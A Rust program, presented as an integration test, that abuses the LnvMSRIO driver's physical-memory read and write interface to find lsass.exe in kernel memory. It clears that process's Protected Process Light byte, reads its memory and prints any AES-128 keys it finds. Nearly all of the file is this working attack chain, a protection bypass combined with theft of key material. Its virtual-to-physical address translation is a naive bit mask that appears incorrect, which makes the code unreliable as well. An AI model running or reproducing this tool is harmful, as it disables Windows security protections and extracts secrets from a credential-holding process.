//! Integration test: AES key schedule scanning via LnvMSRIO + PPL bypass
//!
//! Full pipeline:
//!   1. Load LnvMSRIO driver
//!   2. Locate target process EPROCESS (lsass.exe by default)
//!   3. Clear PPL protection byte
//!   4. Open process with PROCESS_VM_READ
//!   5. Enumerate committed memory with VirtualQueryEx
//!   6. Scan first 1000 pages for AES-128 key schedules
//!   7. Report findings
//!
//! Run: cargo run --example test_aes_scan
//!
//! Requires: LnvMSRIO.sys loaded, run as Administrator

#![allow(non_snake_case, non_camel_case_types, dead_code)]

use std::ffi::c_void;
use std::io;
use std::mem;
use std::ptr;

// =============================================================================
// FFI types
// =============================================================================

type HANDLE = *mut c_void;
type DWORD = u32;
type BOOL = i32;
type LPCWSTR = *const u16;
type SIZE_T = usize;
type NTSTATUS = i32;

const INVALID_HANDLE_VALUE: HANDLE = -1isize as HANDLE;
const GENERIC_READ: DWORD = 0x80000000;
const GENERIC_WRITE: DWORD = 0x40000000;
const FILE_SHARE_READ: DWORD = 0x00000001;
const FILE_SHARE_WRITE: DWORD = 0x00000002;
const OPEN_EXISTING: DWORD = 3;
const FILE_ATTRIBUTE_NORMAL: DWORD = 0x80;

const PROCESS_VM_READ: DWORD = 0x0010;
const PROCESS_QUERY_INFORMATION: DWORD = 0x0400;

const MEM_COMMIT: DWORD = 0x1000;
const PAGE_READWRITE: DWORD = 0x04;
const PAGE_EXECUTE_READWRITE: DWORD = 0x40;
const PAGE_READONLY: DWORD = 0x02;

const PAGE_SIZE: usize = 0x1000;
const MAX_PAGES_TO_SCAN: usize = 1000;

// Target process name (change as needed)
const TARGET_PROCESS: &str = "lsass.exe";

// =============================================================================
// Structures
// =============================================================================

#[repr(C)]
struct MEMORY_BASIC_INFORMATION {
    base_address: *mut c_void,
    allocation_base: *mut c_void,
    allocation_protect: DWORD,
    _pad1: u32,
    region_size: SIZE_T,
    state: DWORD,
    protect: DWORD,
    mem_type: DWORD,
    _pad2: u32,
}

#[repr(C, packed)]
#[derive(Clone, Copy)]
struct PhysMemReadInput {
    physical_address: u64,
    access_size: u32,
    count: u32,
}

#[repr(C, packed)]
#[derive(Clone, Copy)]
struct PhysMemWriteInput {
    physical_address: u64,
    access_size: u32,
    count: u32,
    // data follows immediately after
}

// =============================================================================
// FFI imports
// =============================================================================

extern "system" {
    fn CreateFileW(
        file_name: LPCWSTR,
        desired_access: DWORD,
        share_mode: DWORD,
        security_attributes: *mut c_void,
        creation_disposition: DWORD,
        flags_and_attributes: DWORD,
        template_file: HANDLE,
    ) -> HANDLE;

    fn DeviceIoControl(
        device: HANDLE,
        io_control_code: DWORD,
        in_buffer: *const c_void,
        in_buffer_size: DWORD,
        out_buffer: *mut c_void,
        out_buffer_size: DWORD,
        bytes_returned: *mut DWORD,
        overlapped: *mut c_void,
    ) -> BOOL;

    fn CloseHandle(handle: HANDLE) -> BOOL;

    fn OpenProcess(
        desired_access: DWORD,
        inherit_handle: BOOL,
        process_id: DWORD,
    ) -> HANDLE;

    fn VirtualQueryEx(
        process: HANDLE,
        address: *const c_void,
        buffer: *mut MEMORY_BASIC_INFORMATION,
        length: SIZE_T,
    ) -> SIZE_T;

    fn ReadProcessMemory(
        process: HANDLE,
        base_address: *const c_void,
        buffer: *mut c_void,
        size: SIZE_T,
        bytes_read: *mut SIZE_T,
    ) -> BOOL;

    fn NtQuerySystemInformation(
        system_information_class: u32,
        system_information: *mut c_void,
        system_information_length: u32,
        return_length: *mut u32,
    ) -> NTSTATUS;
}

// IOCTL codes
const IOCTL_READ_MSR: DWORD = 0x9C402084;
const IOCTL_PHYS_MEM_READ: DWORD = 0x9C406104;
const IOCTL_PHYS_MEM_WRITE: DWORD = 0x9C40A108;

// =============================================================================
// AES detection (self-contained copy for standalone binary)
// =============================================================================

const SBOX: [u8; 256] = [
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16,
];

const RCON: [u8; 10] = [0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36];

fn aes128_key_expand(key: &[u8; 16]) -> [u8; 176] {
    let mut expanded = [0u8; 176];
    expanded[..16].copy_from_slice(key);
    let mut i = 16;
    let mut rcon_idx = 0;
    while i < 176 {
        let mut temp = [expanded[i-4], expanded[i-3], expanded[i-2], expanded[i-1]];
        if i % 16 == 0 {
            temp.rotate_left(1);
            for b in temp.iter_mut() { *b = SBOX[*b as usize]; }
            temp[0] ^= RCON[rcon_idx];
            rcon_idx += 1;
        }
        for j in 0..4 {
            expanded[i + j] = expanded[i - 16 + j] ^ temp[j];
        }
        i += 4;
    }
    expanded
}

fn is_valid_aes128_schedule(data: &[u8]) -> bool {
    if data.len() < 176 { return false; }
    let key: [u8; 16] = data[..16].try_into().unwrap();
    if key.iter().all(|&b| b == 0) { return false; }
    let expected = aes128_key_expand(&key);
    expected[16..] == data[16..176]
}

/// Scan a page buffer for AES-128 key schedules
fn scan_page_for_aes(page: &[u8]) -> Vec<(usize, [u8; 16])> {
    let mut results = Vec::new();
    if page.len() < 176 { return results; }
    for offset in 0..=(page.len() - 176) {
        if is_valid_aes128_schedule(&page[offset..offset+176]) {
            let mut key = [0u8; 16];
            key.copy_from_slice(&page[offset..offset+16]);
            results.push((offset, key));
        }
    }
    results
}

// =============================================================================
// Driver handle (self-contained)
// =============================================================================

fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

struct DriverHandle {
    handle: HANDLE,
}

impl DriverHandle {
    fn open() -> io::Result<Self> {
        let path = to_wide("\\\\.\\WinMsrDev");
        let handle = unsafe {
            CreateFileW(
                path.as_ptr(),
                GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                ptr::null_mut(),
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                ptr::null_mut(),
            )
        };
        if handle == INVALID_HANDLE_VALUE {
            return Err(io::Error::last_os_error());
        }
        Ok(Self { handle })
    }

    fn read_phys_u64(&self, phys_addr: u64) -> io::Result<u64> {
        let input = PhysMemReadInput {
            physical_address: phys_addr,
            access_size: 8,
            count: 1,
        };
        let mut output: u64 = 0;
        let mut bytes_returned: DWORD = 0;
        let ok = unsafe {
            DeviceIoControl(
                self.handle,
                IOCTL_PHYS_MEM_READ,
                &input as *const _ as *const c_void,
                mem::size_of::<PhysMemReadInput>() as DWORD,
                &mut output as *mut _ as *mut c_void,
                8,
                &mut bytes_returned,
                ptr::null_mut(),
            )
        };
        if ok == 0 { Err(io::Error::last_os_error()) } else { Ok(output) }
    }

    fn read_phys(&self, phys_addr: u64, size: usize) -> io::Result<Vec<u8>> {
        let input = PhysMemReadInput {
            physical_address: phys_addr,
            access_size: 1,
            count: size as u32,
        };
        let mut buffer = vec![0u8; size];
        let mut bytes_returned: DWORD = 0;
        let ok = unsafe {
            DeviceIoControl(
                self.handle,
                IOCTL_PHYS_MEM_READ,
                &input as *const _ as *const c_void,
                mem::size_of::<PhysMemReadInput>() as DWORD,
                buffer.as_mut_ptr() as *mut c_void,
                size as DWORD,
                &mut bytes_returned,
                ptr::null_mut(),
            )
        };
        if ok == 0 { Err(io::Error::last_os_error()) } else { Ok(buffer) }
    }

    fn write_phys_byte(&self, phys_addr: u64, value: u8) -> io::Result<()> {
        // 16-byte header + 1 byte data
        let mut buf = [0u8; 17];
        let header_bytes = phys_addr.to_le_bytes();
        buf[0..8].copy_from_slice(&header_bytes);
        buf[8..12].copy_from_slice(&1u32.to_le_bytes()); // access_size = 1
        buf[12..16].copy_from_slice(&1u32.to_le_bytes()); // count = 1
        buf[16] = value;

        let mut bytes_returned: DWORD = 0;
        let ok = unsafe {
            DeviceIoControl(
                self.handle,
                IOCTL_PHYS_MEM_WRITE,
                buf.as_ptr() as *const c_void,
                17,
                ptr::null_mut(),
                0,
                &mut bytes_returned,
                ptr::null_mut(),
            )
        };
        if ok == 0 { Err(io::Error::last_os_error()) } else { Ok(()) }
    }

    fn read_msr(&self, msr: u32) -> io::Result<u64> {
        #[repr(C, packed)]
        struct MsrIn { index: u32, _pad: u32 }
        let input = MsrIn { index: msr, _pad: 0 };
        let mut output: u64 = 0;
        let mut bytes_returned: DWORD = 0;
        let ok = unsafe {
            DeviceIoControl(
                self.handle,
                IOCTL_READ_MSR,
                &input as *const _ as *const c_void,
                8,
                &mut output as *mut _ as *mut c_void,
                8,
                &mut bytes_returned,
                ptr::null_mut(),
            )
        };
        if ok == 0 { Err(io::Error::last_os_error()) } else { Ok(output) }
    }
}

impl Drop for DriverHandle {
    fn drop(&mut self) {
        if self.handle != INVALID_HANDLE_VALUE {
            unsafe { CloseHandle(self.handle); }
        }
    }
}

// =============================================================================
// EPROCESS location helpers
// =============================================================================

// Offsets (Build 26200)
const KPCR_CURRENT_PRCB: u64 = 0x180;
const KPRCB_CURRENT_THREAD: u64 = 0x008;
const KTHREAD_PROCESS: u64 = 0x220;
const EPROCESS_PID: u64 = 0x1D0;
const EPROCESS_IMAGE_NAME: u64 = 0x338;
const EPROCESS_ACTIVE_LINKS: u64 = 0x540;
const EPROCESS_PROTECTION: u64 = 0x87A;

fn virt_to_phys(vaddr: u64) -> u64 {
    vaddr & 0x000F_FFFF_FFFF_FFFF
}

/// Find target process EPROCESS by walking ActiveProcessLinks
fn find_target_eprocess(driver: &DriverHandle, target_name: &str) -> io::Result<(u64, u64)> {
    // Get KPCR via MSR
    let kpcr_virt = driver.read_msr(0xC0000101)?;
    let kpcr_phys = virt_to_phys(kpcr_virt);

    // Walk chain
    let prcb_virt = driver.read_phys_u64(kpcr_phys + KPCR_CURRENT_PRCB)?;
    let thread_virt = driver.read_phys_u64(virt_to_phys(prcb_virt) + KPRCB_CURRENT_THREAD)?;
    let eproc_virt = driver.read_phys_u64(virt_to_phys(thread_virt) + KTHREAD_PROCESS)?;

    // Validate we have a valid starting EPROCESS
    let start_phys = virt_to_phys(eproc_virt);
    let start_pid = driver.read_phys_u64(start_phys + EPROCESS_PID)?;
    println!("[*] Starting EPROCESS: 0x{:016X} (PID {})", eproc_virt, start_pid);

    // Walk ActiveProcessLinks to find target
    let target_lower = target_name.to_ascii_lowercase();
    let mut current_virt = eproc_virt;
    let mut visited = 0;

    loop {
        if visited > 512 {
            return Err(io::Error::new(io::ErrorKind::NotFound, "exceeded 512 entries"));
        }

        let current_phys = virt_to_phys(current_virt);

        // Read image name (15 bytes)
        let name_bytes = driver.read_phys(current_phys + EPROCESS_IMAGE_NAME, 15)?;
        let name: String = name_bytes.iter()
            .take_while(|&&b| b != 0)
            .map(|&b| b as char)
            .collect();

        let pid = driver.read_phys_u64(current_phys + EPROCESS_PID)?;

        if name.to_ascii_lowercase() == target_lower {
            return Ok((current_virt, pid));
        }

        // Follow Flink
        let flink = driver.read_phys_u64(current_phys + EPROCESS_ACTIVE_LINKS)?;
        let next_virt = flink.wrapping_sub(EPROCESS_ACTIVE_LINKS);

        if next_virt == eproc_virt || next_virt == 0 {
            return Err(io::Error::new(
                io::ErrorKind::NotFound,
                format!("'{}' not found in process list", target_name),
            ));
        }

        current_virt = next_virt;
        visited += 1;
    }
}

// =============================================================================
// Main
// =============================================================================

fn main() {
    println!("=== AES Key Schedule Scan Integration Test ===");
    println!("Target: {}", TARGET_PROCESS);
    println!();

    // Step 1: Open LnvMSRIO
    println!("[1/6] Opening LnvMSRIO driver...");
    let driver = match DriverHandle::open() {
        Ok(d) => d,
        Err(e) => {
            println!("[-] Failed: {}. Ensure LnvMSRIO.sys is loaded.", e);
            std::process::exit(1);
        }
    };
    println!("[+] Driver opened");

    // Step 2: Find target EPROCESS
    println!("[2/6] Locating {} EPROCESS...", TARGET_PROCESS);
    let (eproc_virt, pid) = match find_target_eprocess(&driver, TARGET_PROCESS) {
        Ok(r) => r,
        Err(e) => {
            println!("[-] Failed to find {}: {}", TARGET_PROCESS, e);
            std::process::exit(1);
        }
    };
    println!("[+] Found: EPROCESS=0x{:016X}, PID={}", eproc_virt, pid);

    // Step 3: Read and clear PPL
    println!("[3/6] Checking PPL protection...");
    let eproc_phys = virt_to_phys(eproc_virt);
    let ppl_byte = match driver.read_phys(eproc_phys + EPROCESS_PROTECTION, 1) {
        Ok(b) => b[0],
        Err(e) => {
            println!("[-] Failed to read protection byte: {}", e);
            std::process::exit(1);
        }
    };
    println!("    Current PS_PROTECTION: 0x{:02X}", ppl_byte);

    if ppl_byte != 0 {
        println!("[*] Clearing PPL (writing 0x00 to EPROCESS+0x{:X})...", EPROCESS_PROTECTION);
        if let Err(e) = driver.write_phys_byte(eproc_phys + EPROCESS_PROTECTION, 0x00) {
            println!("[-] PPL clear failed: {}", e);
            std::process::exit(1);
        }
        println!("[+] PPL cleared");
    } else {
        println!("[+] Process is not PPL-protected (already 0x00)");
    }

    // Step 4: Open process with VM_READ
    println!("[4/6] Opening process handle (PID {})...", pid);
    let proc_handle = unsafe {
        OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, 0, pid as DWORD)
    };
    if proc_handle.is_null() || proc_handle == INVALID_HANDLE_VALUE {
        let err = io::Error::last_os_error();
        println!("[-] OpenProcess failed: {}", err);
        println!("    If ACCESS_DENIED, PPL clear may not have taken effect.");
        println!("    Try running again or verify offset 0x{:X} is correct.", EPROCESS_PROTECTION);
        std::process::exit(1);
    }
    println!("[+] Process handle acquired");

    // Step 5: Enumerate heap with VirtualQueryEx
    println!("[5/6] Enumerating committed memory regions...");
    let mut regions: Vec<(usize, usize)> = Vec::new();
    let mut address: usize = 0;
    let mut total_committed: usize = 0;

    loop {
        let mut mbi: MEMORY_BASIC_INFORMATION = unsafe { mem::zeroed() };
        let result = unsafe {
            VirtualQueryEx(
                proc_handle,
                address as *const c_void,
                &mut mbi,
                mem::size_of::<MEMORY_BASIC_INFORMATION>(),
            )
        };

        if result == 0 {
            break;
        }

        // Only scan committed, readable memory
        if mbi.state == MEM_COMMIT
            && (mbi.protect == PAGE_READWRITE
                || mbi.protect == PAGE_READONLY
                || mbi.protect == PAGE_EXECUTE_READWRITE)
        {
            regions.push((mbi.base_address as usize, mbi.region_size));
            total_committed += mbi.region_size;
        }

        address = mbi.base_address as usize + mbi.region_size;
        if address == 0 { break; } // wrapped around
    }

    println!("[+] Found {} readable regions ({:.1} MB committed)",
        regions.len(),
        total_committed as f64 / (1024.0 * 1024.0)
    );

    // Step 6: Scan pages for AES schedules
    println!("[6/6] Scanning first {} pages for AES-128 key schedules...", MAX_PAGES_TO_SCAN);
    let mut pages_scanned: usize = 0;
    let mut keys_found: Vec<(usize, usize, [u8; 16])> = Vec::new(); // (region_base, offset, key)
    let mut read_errors: usize = 0;
    let mut page_buf = vec![0u8; PAGE_SIZE];

    'outer: for &(base, size) in &regions {
        let pages_in_region = size / PAGE_SIZE;
        for page_idx in 0..pages_in_region {
            if pages_scanned >= MAX_PAGES_TO_SCAN {
                break 'outer;
            }

            let page_addr = base + page_idx * PAGE_SIZE;
            let mut bytes_read: SIZE_T = 0;
            let ok = unsafe {
                ReadProcessMemory(
                    proc_handle,
                    page_addr as *const c_void,
                    page_buf.as_mut_ptr() as *mut c_void,
                    PAGE_SIZE,
                    &mut bytes_read,
                )
            };

            if ok == 0 || bytes_read < 176 {
                read_errors += 1;
                pages_scanned += 1;
                continue;
            }

            let hits = scan_page_for_aes(&page_buf[..bytes_read]);
            for (offset, key) in hits {
                keys_found.push((page_addr, offset, key));
            }

            pages_scanned += 1;
        }
    }

    // Cleanup
    unsafe { CloseHandle(proc_handle); }

    // Restore PPL if we cleared it
    if ppl_byte != 0 {
        println!();
        println!("[*] Restoring PPL to 0x{:02X}...", ppl_byte);
        if let Err(e) = driver.write_phys_byte(eproc_phys + EPROCESS_PROTECTION, ppl_byte) {
            println!("[!] WARNING: Failed to restore PPL: {}", e);
        } else {
            println!("[+] PPL restored");
        }
    }

    // Report
    println!();
    println!("=== Results ===");
    println!("  Pages scanned:  {}", pages_scanned);
    println!("  Read errors:    {}", read_errors);
    println!("  AES keys found: {}", keys_found.len());

    if !keys_found.is_empty() {
        println!();
        println!("  Discovered AES-128 keys:");
        for (i, (page_addr, offset, key)) in keys_found.iter().enumerate() {
            let abs_addr = page_addr + offset;
            print!("    [{}] VA=0x{:016X} Key=", i + 1, abs_addr);
            for b in key.iter() {
                print!("{:02X}", b);
            }
            println!();

            if i >= 19 {
                println!("    ... ({} more)", keys_found.len() - 20);
                break;
            }
        }
    } else {
        println!();
        println!("  No AES key schedules found in the scanned pages.");
        println!("  Consider scanning more pages or targeting heap regions.");
    }
}
